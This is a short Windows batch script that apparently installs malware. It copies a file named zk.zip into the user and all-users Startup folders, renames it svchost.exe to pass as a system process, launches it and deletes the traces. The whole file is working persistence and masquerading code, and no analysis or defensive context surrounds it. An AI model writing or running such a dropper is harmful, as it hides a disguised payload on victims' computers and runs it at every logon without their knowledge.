

echo f|xcopy /f ".\zk.zip" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 
rename "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\zk.zip" "svchost.exe"

start explorer "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"


echo f|xcopy ".\zk.zip" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
rename "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\zk.zip" "svchost.exe"

del ".\zk.zip"
del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\zk.zip"


REM // B -> P -> Z -> Net ->P ->MVOVS